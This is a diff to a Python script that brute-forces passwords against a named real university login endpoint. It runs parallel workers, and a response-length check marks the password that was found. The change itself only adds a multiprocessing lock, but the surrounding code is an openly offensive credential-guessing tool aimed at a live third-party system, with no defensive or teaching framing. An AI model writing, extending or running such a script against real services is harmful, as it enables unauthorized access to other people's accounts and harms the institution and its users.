@@ -3,6 +3,7 @@ __author__ = 'lms'
 import requests
 import time
 import multiprocessing.dummy as multiThreading
+import multiprocessing
 
 
 request_url = "http://w.nuaa.edu.cn/iPortal/action/doLogin.do"
@@ -54,10 +55,12 @@ def verify(index, sem):
 
                 print password_array[index]
                 if loginRequest.headers['content-length'] >= '258':
+                    #lock.acquire()
                     password = password_array[index]
                     print index
                     print "The password is " + password
                     sem.set()
+                    #lock.release()
                     end_time = time.time()
                     print "The time spent is " + str(end_time-start_time)
                     return
@@ -65,6 +68,7 @@ def verify(index, sem):
 
 if __name__ == "__main__":
     sem = multiThreading.Event() #use semaphore
+    lock = multiprocessing.Lock()
     start_time = time.time()
     for index in range(4):
         multiThreading.Process(target=verify, args=(index, sem)).start()
